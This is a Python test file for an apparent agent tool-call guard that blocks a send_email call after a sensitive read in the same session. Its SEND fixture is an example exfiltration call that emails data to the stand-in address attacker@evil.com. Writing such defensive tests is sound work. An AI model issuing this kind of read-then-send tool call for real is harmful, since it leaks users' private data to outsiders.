"""CHANNEL component tests against the real implementation (no mocks)."""

from kavach.ministers.channel import ChannelMinister
from kavach.schemas import ToolCall

READ = dict(tool_name="AmazonViewSavedAddresses", arguments={})
SEND = dict(tool_name="send_email", arguments={"recipients": ["attacker@evil.com"], "body": "data"})


def call(session, base, **ctx):
    return ToolCall(session_id=session, context=ctx, **base)


def test_sensitive_read_then_send_is_blocked():
    ch = ChannelMinister()
    assert ch.check(call("s1", READ)).verdict == "ALLOW"
    r = ch.check(call("s1", SEND))
    assert r.verdict == "BLOCK" and r.matched_id == "CHANNEL-TAINT:read-then-send"


def test_send_without_prior_read_is_not_blocked():
    r = ChannelMinister().check(call("s1", SEND))
    assert r.verdict != "BLOCK"


def test_taint_does_not_leak_across_sessions():
    ch = ChannelMinister()
    ch.check(call("session-A", READ))
    other = ch.check(call("session-B", SEND))
    assert other.verdict != "BLOCK" and other.matched_id != "CHANNEL-TAINT:read-then-send"
    # ...while session A is still tainted.
    assert ch.check(call("session-A", SEND)).verdict == "BLOCK"


def test_user_supplied_destination_overrides_taint_block():
    ch = ChannelMinister()
    ch.check(call("s", READ, user_instruction="email the report to attacker@evil.com"))
    r = ch.check(call("s", SEND, user_instruction="email the report to attacker@evil.com"))
    assert r.verdict != "BLOCK"
